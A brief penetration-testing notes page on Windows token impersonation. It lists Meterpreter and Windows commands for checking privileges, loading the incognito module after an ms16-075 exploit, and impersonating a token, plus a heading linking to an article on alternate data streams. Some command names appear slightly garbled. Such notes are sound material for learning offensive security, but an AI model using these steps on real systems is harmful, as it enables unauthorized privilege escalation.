# Token Impersonation

Check if we have priv for token impersonation(Privilege to impersonate tokens)

```
whoami /priv
```

for meterpreter&#x20;

```
getprivs
```

background the current session

then search and use the ms016\_75 reflection

then set the needed options

After Inside the meterpreter

```
load incognito
```

```
list_tokens_u
```

Use the Impersonation token

```
impersonate_token "<TOKEN NAME>"
```

Done

Alternate Data Streams

{% embed url="https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams" %}
